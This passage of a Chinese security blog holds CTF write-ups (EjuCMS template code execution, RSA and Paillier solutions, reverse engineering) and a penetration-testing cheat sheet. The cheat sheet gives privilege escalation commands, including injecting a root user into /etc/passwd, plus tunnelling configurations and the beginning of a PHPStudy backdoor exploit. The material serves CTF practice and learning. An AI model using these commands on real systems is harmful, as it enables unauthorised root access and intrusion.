Hacked_By_V V今天看到了一个弱口令的站，反手就把他日了。听说后台密码是admin/123456 http://47.52.113.129:10002/ 链接：https://pan.baidu.com/s/1FL7scmbbEvIP3wskLVGVOw 提取码：1234 易居CMS（EjuCMS），下载源码，版本2.x，给了后台账密。首先搜索现成漏洞，存在后台模板代码执行漏洞。 找到后台/login.php?s=Admin/login进入，功能模块-模板管理-default管理，随便找一个文件，如 pc下的list_search.htm，显然能知道此为搜索结果页模板，执行代码部分都位于花括号&#123;&#125;中，尝试插入&#123;php&#125;phpinfo();&#123;/php&#125;保存，前端发现能成功执行。（可在目录下根据时间查看他人修改痕迹2333~） 一开始将代码修改为&#123;php&#125;echo system(&#39;ls&#39;);&#123;/php&#125;发现执行不成功，回到phpinfo结果页查看disable_functions，看到passthru/exec/system/putenv/shell_exec全不能使用。 换读取函数上，修改代码为&#123;php&#125;print_r(scand_dir(&#39;.&#39;));&#123;/php&#125;读到目录下flag文件flag_BzH652，再用&#123;php&#125;print_r(file_get_contents(&#39;flag_BzH652&#39;));&#123;/php&#125;读出flag。 ​ Cryptocheck_in 关于这道题，我听过一个及其诡异疯狂的谣言，在那漫长到无法计算的岁月之前，这道题就已经存在了。 123456789101112131415161718192021222324252627282930313233from gmpy2 import *from sympy import isprime,nextprimefrom Crypto.Util.number import getPrime as getprime ,long_to_bytes,bytes_to_long,inversefrom vanish import flagimport randomdef Getprime(g): while True: p=g*random.randint(1,g)+1 if isprime(p): return pm=bytes_to_long(flag)g=getprime(512)p=Getprime(g)q=Getprime(g)e=65537def lcm(a,b): return (a*b)/gcd(a,b)print &#x27;lcm(p-1,q-1): %d&#x27;%(lcm(p-1,q-1))print &#x27;n: %d&#x27;%(p*q)print &#x27;c: %d&#x27;%(pow(m,e,p*q))&#x27;&#x27;&#x27;lcm(p-1,q-1): 29222879530390785742605477742453420902991175027283185502224574005903986263169096240656898659768251131170153243355896585116206546809026765977240398343841844413932022486239027317290376878970267549705130293352356070399197681533774641809920245792277386418338948725614463605422608450981946445029718369662946357705499281823362508397007696635982211082237545037851621498721235291885337720080893169582699780294708804334786758878624750037193583886404728146815380945201540n: 2228582814888322539771891137733971181257097900700884269780928959802985615275288341111620316685788511492461651695428697100554113037555468881895905318207963274537589532345166133820089694201148988443496514751074857966136041157336680322417272183777409351597268908625677512781049274972325769500959755298004643407023188886359792411648183582888979219785653927285023667015990929441992061367448365123092899330885934801013411132173550954938961520075931155848843991824723727187297663420031211934554344568933171179175237722716971390081142435747796272698118097337803559316319210494963021258386613285360239662354953552369582646607c: 2201106853018581355094419701171997731036843750081916703504266002782698731288317690546242336345890702261049147276084047271293227314969153138029180802403349980519050857699472720333400348342466190619778247784674359271736569275019018808569614566880813745619585529292155639979431043005511905548345767685472340763230813956617014122768477272236518467064016133244646900977041959848793579834848773548018337874928875046550721154575652528641850315494384644468806058021812603748441246192757443085386516155814337307681275922473564325028703523754319072117202083218199961250157611091952832038366393322275194833927035639232266868638&#x27;&#x27;&#x27; 由于 $lcm(p-1,q-1) =k(p-1)(q-1)&lt;&lt; n=pq$，求 $d$ 时用的模如为常规的 $\\varphi(n)=(p-1)(q-1)$ 则 $k$ 的爆破空间将很大，所以用的模应是 $\\lambda(n)=lcm(p-1,q-1)$。再按常规解 $m$ 。 12345678910lcm=29222879530390785742605477742453420902991175027283185502224574005903986263169096240656898659768251131170153243355896585116206546809026765977240398343841844413932022486239027317290376878970267549705130293352356070399197681533774641809920245792277386418338948725614463605422608450981946445029718369662946357705499281823362508397007696635982211082237545037851621498721235291885337720080893169582699780294708804334786758878624750037193583886404728146815380945201540n=2228582814888322539771891137733971181257097900700884269780928959802985615275288341111620316685788511492461651695428697100554113037555468881895905318207963274537589532345166133820089694201148988443496514751074857966136041157336680322417272183777409351597268908625677512781049274972325769500959755298004643407023188886359792411648183582888979219785653927285023667015990929441992061367448365123092899330885934801013411132173550954938961520075931155848843991824723727187297663420031211934554344568933171179175237722716971390081142435747796272698118097337803559316319210494963021258386613285360239662354953552369582646607c=2201106853018581355094419701171997731036843750081916703504266002782698731288317690546242336345890702261049147276084047271293227314969153138029180802403349980519050857699472720333400348342466190619778247784674359271736569275019018808569614566880813745619585529292155639979431043005511905548345767685472340763230813956617014122768477272236518467064016133244646900977041959848793579834848773548018337874928875046550721154575652528641850315494384644468806058021812603748441246192757443085386516155814337307681275922473564325028703523754319072117202083218199961250157611091952832038366393322275194833927035639232266868638e = 65537import gmpy2d=gmpy2.invert(e,lcm)m=pow(c,d,n)print(bytes.fromhex(hex(m)[2:])) ​ warm_up 代码粗糙的质感刺痛了我的眼睛，我似乎能通过这文件锋利的边缘窥探到“它”的本质，但是我不能这样做，我害怕我会看到这道题背后卑劣歹毒如同幽灵一般的隐喻。 Hint: 是一个由RSA衍生出来的密码系统，还挺年轻的。 12345678910111213141516171819202122232425from Crypto.Util.number import getPrime as getprime ,long_to_bytes,bytes_to_long,inversefrom vanish import flagfrom sympy import isprime,nextprimeimport randomm=bytes_to_long(flag)p=getprime(512)q=nextprime(512)n=p*qr=random.randint(1,n)g=random.randint(1,n)c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)print &quot;c=%d&quot;%(c)print &quot;n=%d&quot;%(n)print &quot;g=%d&quot;%(g)&#x27;&#x27;&#x27;c=14643617840485727260687883789514337554960495078025159182484344940901600090810578182116617501128323641882943106663241094886209190199404002314247096613925999812837877843566116787148411743428714726661042213165729562285577768043368385746666607442372252641495230532588344276427261824205414379772728577442269620217619275n=5650215343715484415924649393302012617620686312875699289646188186788806118580423414401283971780836312947326343790326120926819026727018136169739576760024802083g=786539430846729749998127835613552594423101498023741082894370020014675937062722533682541592019332908209917194089077366019472368764411032602494945304850258108&#x27;&#x27;&#x27; 1999年提出的Paillier同态加密，这里为一般情况，参考算法代入计算即可。 123456789101112131415161718c=14643617840485727260687883789514337554960495078025159182484344940901600090810578182116617501128323641882943106663241094886209190199404002314247096613925999812837877843566116787148411743428714726661042213165729562285577768043368385746666607442372252641495230532588344276427261824205414379772728577442269620217619275n=5650215343715484415924649393302012617620686312875699289646188186788806118580423414401283971780836312947326343790326120926819026727018136169739576760024802083g=786539430846729749998127835613552594423101498023741082894370020014675937062722533682541592019332908209917194089077366019472368764411032602494945304850258108import gmpy2def L(x): return (x-1)//n#分解np=521q=10844943078148722487379365438199640340922622481527253914867923583087919613398125555472713957352852807960319277908495433640727498516349589577235272092178123lcm=gmpy2.lcm(p-1,q-1)u=gmpy2.invert(L(pow(g,lcm,n*n)),n)m=L(pow(c,lcm,n*n))*u%nprint(bytes.fromhex(hex(m)[2:])) ​ ezrsa 或许是出于理性亦或是恐惧，总之我把这道题藏了起来。我暗中感觉到它有着诱人发狂的能力，我不能让更多人见到它，这道题是黑暗中不可名状的恶兽。 12345678910111213141516171819202122232425262728from Crypto.Util.number import *from secret import e3,hint,flage1=2p1=1407082287125181464014767936705655200254016298201118080211963q1=4483497795612950594917254979514794222210515250120330465584919hint=int(hint.encode(&#x27;hex&#x27;),16)c1=pow(hint,e1,p1*q1)e2=5q2=898033p2=1027487assert e3&lt;=300c2=pow(e3,e2,p2*q2)q3=16471885912035642894544190467774867069446937372970845578732298073p3=21122913513992623721920275602985463699928507831138027#flag=&#x27;flag&#123;*************&#125;&#x27;flag=int(flag.encode(&#x27;hex&#x27;),16) c3=pow(flag,e3,p3*q3)print c1 #1094524901124574666920734011106836493645715846893412590792284228545024220996290692759698315651894211650519689592667719756print c2 #779811265199print c3 #346925245648012783854132941104554194717281878370806475831055718275298366664505658836564073456294047402009856656647760 RSA小套娃题。 先从 $e1,p1,q1,c1$ 解hint，$e=2$ 的情形为Rabin加密 123456789101112131415161718192021222324252627import gmpy2def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) e1=2p1=1407082287125181464014767936705655200254016298201118080211963q1=4483497795612950594917254979514794222210515250120330465584919c1=1094524901124574666920734011106836493645715846893412590792284228545024220996290692759698315651894211650519689592667719756m=rabin_decrypt(c1,p1,q1,e1)for k in m: try: print(bytes.fromhex(hex(k)[2:])) except: pass #hint: https://eprint.iacr.org/2013/117.pdf 四解中有一解为真正的hint，得到一个paper网址：https://eprint.iacr.org/2013/117.pdf 再从 $e2,p2,q2,c2$ 解 $e3$，常规RSA 12345678910111213p2=1027487q2=898033e2=5c2=779811265199import gmpy2fn2=(p2-1)*(q2-1)d2=gmpy2.invert(e2,fn2)e3=pow(c2,d2,p2*q2)print(e3)#e3=239 最后从 $e3,p3,q3,c3$ 解 $m$，难点在于存在情形 $e \\mid p-1,e \\mid q-1$，参考hint论文，在有限域下求 $e$ 次根 123456789101112131415161718192021###Sagec = 346925245648012783854132941104554194717281878370806475831055718275298366664505658836564073456294047402009856656647760p = 21122913513992623721920275602985463699928507831138027q = 16471885912035642894544190467774867069446937372970845578732298073e = 239P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=&#x27;NTL&#x27;)f=a^e-cmps=f.monic().roots()P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=&#x27;NTL&#x27;)g=a^e-cmqs=g.monic().roots()for mpp in mps: x=mpp[0] for mqq in mqs: y=mqq[0] solution = hex(CRT_list([int(x), int(y)], [p, q]))[2:] if solution.startswith(&#x27;666c&#x27;): print(solution) ​ REVERSE⎛⎝WDNMD⎠⎞ 我起了，一枪秒了，有什么好说的（白给签到题） F5未发现有用信息，回到汇编代码，发现main()函数里有flag后半段： 回到全局反汇编窗口，Alt+T全局搜索”flag{“，发现data段藏着flag前半段： ​ 98年的，我玩不过她 如果不是真的喜欢，谁又愿意做舔狗呢 从字符串窗口定位入口在sub_140011950函数： 获取长度为10的字符串存入Buffer数组，令v5[0:10]=Buffer[5:15]，经sub_14001128A函数处理后得到Str1，将其与 I_love_y&amp;u 比较，相等则正确。 跟进sub_14001128A函数，发现switch-case遍历结构： 分别把switch-case结构中case各字符对应的结果字符求出，逐个比对 I_love_y&amp;u 每个字符，还原得原始Buffer[5:15]值，添加前四个字符“flag{”可得flag。 ​ four steps 做re好像挺简单的，不就是解决了这四个步骤不就好了。 从字符串窗口定位入口在sub_1400159A0函数： 读字符串存入Buffer，第一步sub_1400113AC函数处理，比对Buffer[0:4]；第二步sub_1400113B1函数处理Buffer[4:8]；第二步返回值为0则进入第三步，sub_1400113B6函数处理Buffer[8:12]；第四步sub_1400113C5函数处理Buffer[12:16]。 第一步 先初始化256大小的数组a，再做奇数下标的值前后交换，爆破Buffer[0:4]： 1234567891011121314a=[j for j in range(256)]for j in range(128): if j%2==1: a[j],a[256-j]=a[256-j],a[j]c=[96,106,153,159]m=&#x27;&#x27;for cc in c: for k in range(128): if a[k]^6==cc: m+=chr(k) breakprint(m)#flag 第二步 根据等式爆破，选择合适结果： 1234567891011m=&#x27;&#x27;for x4 in range(128): for x5 in range(128): for x6 in range(128): for x7 in range(128): if (x5&gt;&gt;4)+(x4&gt;&gt;4)==13 and (x7&gt;&gt;4)+(x6&gt;&gt;4)==13 and (x4&amp;0xF)-(x5&amp;0xF)==10 and (x6&amp;0xF)-(x7&amp;0xF)==11 and (x6&amp;0xF)-(x5&amp;0xF)==13 and (x5&gt;&gt;4)==(x6&gt;&gt;4): m=chr(x4)+chr(x5)+chr(x6)+chr(x7) print(m)#6个结果，选择正确的#&#123;ans 第三步 变了码表的base64编码，码表为AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz1234567890+/，编码结果o3kZl3==，使用工具解码得wer_。 第四步 同第一步，爆破Buffer[12:16]： 123456789c=[214,86,18,215]m=&#x27;&#x27;for cc in c: for k in range(128): if 16*(k&amp;0xF)+(k&gt;&gt;4)==cc: m+=chr(k) breakprint(m)#me!&#125; 拼接四步得到的字符串得flag。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"DASCTF 2020 安恒七月赛","slug":"match-DASCTF-2020-安恒七月赛","date":"2020-07-25T07:48:51.000Z","updated":"2020-07-25T09:17:10.216Z","comments":true,"path":"2020/07/25/match-DASCTF-2020-安恒七月赛/","link":"","permalink":"https://lazzzaro.github.io/2020/07/25/match-DASCTF-2020-%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E8%B5%9B/","excerpt":"","text":"​ MISCwelcome to the misc world解压得一张图red_blue.png和加密压缩包flag.rar，那么密码肯定在图里了。 由关键字red/blue想到lsb隐写，用Stegsolve工具查找无结果，放到zsteg命令下看，发现png图，提取出来： 得到压缩包密码 /*///1258/*/@#。 用360压缩打开直接能看到NTFS隐写文件： (23333~~) 打开flag.txt，得到一串字符，由包含的字符猜测为base85编码，尝试解码得到flag。 ​ CRYPTObullshit 给定脚本 123456789101112131415161718from flag import flagdef pairing(a,b): shell = max(a, b) step = min(a, b) if step == b: flag = 0 else: flag = 1 return shell ** 2 + step * 2 + flagdef encrypt(message): res = &#x27;&#x27; for i in range(0,len(message),2): res += str(pairing(message[i],message[i+1])) return resprint(encrypt(flag))# 1186910804152291019933541010532411051999082499105051010395199519323297119520312715722 加密脚本思路： 将明文message每两个字符分别作为pairing()函数的参数，返回的int结果值连接，得到输出密文。 因flag可能包含的ASCII字符的十进制值 $48 \\leq d \\leq 126$，由pairing()函数返回值知，得到的int结果值范围为 $48^2+48\\cdot2+0 \\leq v \\leq 126^2+126\\cdot2+1 \\Rightarrow 2400 \\leq v \\leq 16129$ 按范围分割密文，再分别爆破每个的输入参数： 1234567891011121314151617181920import stringdic=string.printable[:-6]def pairing(a,b): shell = max(a, b) step = min(a, b) if step == b: flag = 0 else: flag = 1 return shell ** 2 + step * 2 + flagc=[11869,10804,15229,10199,3354,10105,3241,10519,9908,2499,10505,10103,9519,9519,3232,9711,9520,3127,15722]flag=&#x27;&#x27;for k in c: for x in dic: for y in dic: if pairing(ord(x),ord(y))==k: flag+=x+yprint(flag) ​ ezrsa 给定脚本 1234567891011121314151617181920212223242526272829303132from secret import flagfrom Crypto.Util.number import getPrime,inverse,bytes_to_long,long_to_bytesfrom sympy import isprimem = bytes_to_long(flag)i=0p=getPrime(1024)r=getPrime(1024)while True: i+=1 q = 5*p+i if isprime(q) : breakn=p*q*re = 65537c = pow(m,e,n)p3 = pow(p,3,n)q3 = pow(q,3,n)print cprint eprint nprint p3print q3#c=121836624300974075697021410307617877799398704636412997043885070081959280989429720121505939271618801519845564677294487289085261071864489530938936756975266796724602572135614554790383740417604947122325421381322155502222532570899845171858215244411945889235509975121332503672838693190271397334662495169940649349725607212867270114445618201171582223868214171942753939282404133460110489725340075179818856587044172460703519751189284498768640898837525773823127259807337383870535232880471869465188882667401540052151795173003568424369575866780354852158304748299284900468768898966143729562589110027789165774068500360970335261801131264801996703446527156709491597639262305131309592217711956181866054589085773085822482247966030763162382493197473555330201343835684065991963179440335668817727280429581864224497755004825170263803174390985868997862117983334405815543271969716910040927833496696049703621334172902517666284662473059140662717708823#e=65537#n=20361372240024088786698455948788052559208001789410016096382703853157107986024860262721685000417719260611935731634077852127432140361792767202581631816544546972750034494061276779878409544779707914261679633764772575040304712361634318086289783951555842021028438799649252652041211341825451500751760872572402250747982495384263677669526575825183733353800694161425360299521143726681387485097281832219009682768523304737252763907939642212542959846630464628135025203489075698699980715986689341069964387779523254203021424865355054215122316160201073604105317768112281914334065349420946717116563634883368316247495042216330408372176714499012778410160478384503335610321108263706243329745785632599707740534386988945259578897614317582546751658480917188464178997026284336861027299289073045677754342746386408505695243800685323283852020325044649604548575089927541935884800327121875191739922436199496098842684301207745090701158839031935190703347091#p3=3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513#q3=7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397 由脚本知 $p,q$ 为线性关系： $q=5p+k,k\\in\\mathbb{Z}$ 又已知 $p,q$ 用 $e=3$ 得到的密文 $p3,q3$，满足 Related Message Attack 条件，运行Sage脚本得到 $p,q$，再求得 $r$，按照常规RSA解法求出flag。 Related Message Attack Sage脚本： 1234567891011121314151617181920212223242526272829303132333435#Sagedef short_pad_attack(c1, c2, e, n): PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (5*x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor &gt;= n^0.4 return diffdef related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (5*x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]if __name__ == &#x27;__main__&#x27;: n = 20361372240024088786698455948788052559208001789410016096382703853157107986024860262721685000417719260611935731634077852127432140361792767202581631816544546972750034494061276779878409544779707914261679633764772575040304712361634318086289783951555842021028438799649252652041211341825451500751760872572402250747982495384263677669526575825183733353800694161425360299521143726681387485097281832219009682768523304737252763907939642212542959846630464628135025203489075698699980715986689341069964387779523254203021424865355054215122316160201073604105317768112281914334065349420946717116563634883368316247495042216330408372176714499012778410160478384503335610321108263706243329745785632599707740534386988945259578897614317582546751658480917188464178997026284336861027299289073045677754342746386408505695243800685323283852020325044649604548575089927541935884800327121875191739922436199496098842684301207745090701158839031935190703347091 e = 3 c1 = 3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513 c2 = 7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397 diff = short_pad_attack(c1, c2, e, n) print(&quot;difference of two messages is %d&quot; % diff) p = related_message_attack(c1, c2, diff, e, n) print(&quot;p:&quot;, p) print(&quot;q:&quot;, 5*p + diff)","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"渗透","slug":"web-渗透","date":"2020-07-23T16:49:37.000Z","updated":"2022-08-27T14:46:26.849Z","comments":true,"path":"2020/07/24/web-渗透/","link":"","permalink":"https://lazzzaro.github.io/2020/07/24/web-%E6%B8%97%E9%80%8F/","excerpt":"","text":"​ 渗透（Hack The Box / HTB）扫描 nmap nmap -sC -sV xx.xx.xx.xx -oA src/ -sC is for using default nmap scripts, -sV for enumerating services versions, -oA is for output ALL format and specify the directory src, NOTICE: you may be adding -Pn if you have an error wait for some time and here is the result. ​ 提权参考：GTFOBins SUID提权（4000权限） SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。 发现系统上运行的所有SUID可执行文件，不同系统适用于不同的命令： 123find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -print 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; 环境变量提权 123456789#/home/raj/script/shell具SUID权限cd /tmpecho “/bin/bash” &gt; pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/raj/script./shellwhoami find 提权 123# 普通用户，进入到/tmp目录下，然后新建一个文件touch abcdfind abcd -exec whoami \\; /etc/shadow 提权 1xxd &quot;/etc/shadow&quot; | xxd -r /etc/passwd 提权 12345cat /etc/passwd&gt;passwdecho &quot;test:abRcsZmlrrKFA:0:0:,,,:/root:/bin/bash&quot; &gt;&gt;passwdcp passwd /etc/passwdpython3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;su - test nl 提权 nl /flag date 提权 /usr/bin/date -f /flag （利用date命令的 -f 参数读取文件） curl 提取 curl file:///flag 以其他用户运行命令 sudo -l （查看此用户拥有的特殊权限，如 NOPASSWD） echo password | su -c userB cat xxx.txt 根目录非root权限 ls -al / （检查根目录权限是否非root） 123456mv bin bin1/bin1/mkdir bin/bin1/chmod 777 bin/bin1/echo &quot;/bin1/cat /flag&quot; &gt; /bin/umount/bin1/chmod 777 /bin/umountexit pkexec提权漏洞 /usr/lib/policykit-1/polkit-agent-helper-1 https://github.com/arthepsy/CVE-2021-4034 12chmod +x ./pkexec_poc./pkexec_poc ​ 非常规读文件12/lib/gcc/x86_64-linux-gnu/[id]/cc1 /etc/passwd -o /dev/null/lib/gcc/x86_64-linux-gnu/[id]/cc1plus /etc/passwd -o /dev/null ​ 内网穿透 探测内网主机 1for k in $( seq 1 255);do ping -c 1 10.203.113.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#x27;&#123;print $4&#125;&#x27;; done 常见端口扫描 EW代理：./ew_for_linux64 -s ssocksd -l 9999 扫描：proxychains3 nmap 扫描常见端口 操作 远程连接数据库：proxychains3 mysql -h 10.203.113.33 -u ctf -p 启动火狐浏览器：proxychains3 firefox 远程连接：proxychains3 rdesktop 10.203.113.34:3389 frpfrp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。 项目地址 https://github.com/fatedier/frp/blob/master/README_zh.md 目录文件： 1234567frpc 客户端可执行程序frpc_full.ini 客户端所有配置项（可以再此文件查看frp的所有的配置项）frpc.ini 客户端配置项frps 服务端可执行程序frps_full.ini 服务端所有配置项（可以再此文件查看frp的所有的配置项）frps.ini 服务端配置项LICENSE 许可证 服务端配置（ frps.ini 文件） 123[common]bind_port = 7000 # 客户端跟服务端绑定的端口号（端口可自定义，需客户端和服务端统一）vhost_http_port = 6001 # 访问6001端口，映射到内网web服务 启动： ./frps -c frps.ini 客户端配置（ frpc.ini 文件） 1234567891011121314151617181920212223[common]server_addr = x.x.x.x # 服务器公网IPserver_port = 7000 # 绑定的端口，自定义，与服务端一致即可[ssh]type = tcplocal_ip = 127.0.0.1 # 绑定的IP，本机填写127.0.0.1即可local_port = 22remote_port = 6008 # ssh默认是22，转发为6008端口# 访问：ssh root@x.x.x.x -p 6008[web]type = httplocal_port = 8080 # 访问本地8080web服务custom_domains = x.x.x.x # 已经备案的域名或服务器公网IP# 访问：http://x.x.x.x:6001 =&gt; http://127.0.0.1:8080[mysql]type = tcplocal_ip = 127.0.0.1 # 绑定的IP，本机填写127.0.0.1即可local_port = 3306remote_port = 4406 # mysql默认是3306，转发为4406端口# 访问：mysql -hx.x.x.x -P4406 -uroot -proot 启动： ./frpc -c frpc.ini ​ 其他 PHPStudy 后门漏洞 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104import requestsimport base64from random import choiceUSER_AGENTS = [ &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;, &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;, &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;, &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;, &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;, &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;, &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;, 